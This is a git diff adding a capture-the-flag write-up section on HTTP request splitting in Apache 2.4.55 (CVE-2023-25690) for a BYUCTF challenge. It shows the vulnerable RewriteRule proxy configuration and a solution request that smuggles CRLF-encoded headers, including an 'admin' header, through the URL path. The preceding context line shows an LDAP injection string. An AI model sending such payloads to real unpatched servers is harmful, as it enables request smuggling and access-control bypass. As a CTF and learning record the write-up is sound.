@@ -4214,6 +4214,41 @@ userPassword:2.5.13.18:=\xx\xx
 userPassword:2.5.13.18:=\xx\xx\xx
 ```
 
+-----------------------
+
+### Request Splitting in Apache 2.4.55[Willy Wonka[BYUCTF]]
+
+-----------------------
+
+- Response splitting occurs in the apache version due to `REWRITE RULE` used in the version.
+
+```conf
+RewriteEngine on
+    RewriteRule "^/name/(.*)" "http://backend:3000/?name=$1" [P]
+    ProxyPassReverse "/name/" "http://backend:3000/"
+```
+
+- Solution-:
+
+```request
+GET /name/a%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aa:%20admin%0d%0a%0d%0aGET%20/ HTTP/1.1
+Host: wonka.chal.cyberjousting.com
+```
+
+- Flag-:
+
+
+![image](https://github.com/user-attachments/assets/529c18e0-4860-48a5-b892-35b032f32131)
+
+--------------------
+
+### Reference:
+
+----------------------
+
+- [Dhmosfunk](https://github.com/dhmosfunk/CVE-2023-25690-POC)
+
+------------------------
 
 
 
